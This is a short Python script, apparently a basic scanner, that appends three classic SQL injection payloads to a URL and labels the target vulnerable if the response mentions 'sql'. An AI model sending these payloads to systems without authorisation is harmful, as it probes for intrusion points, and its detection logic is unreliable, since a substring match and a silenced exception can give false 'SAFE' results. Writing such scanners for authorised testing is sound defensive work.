import requests

payloads = ["' OR '1'='1", "'--", "' OR 1=1--"]

def scan(url):
    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5)

            if "sql" in r.text.lower():
                return {"type": "SQL Injection", "status": "VULNERABLE"}
        except:
            pass

    return {"type": "SQL Injection", "status": "SAFE"}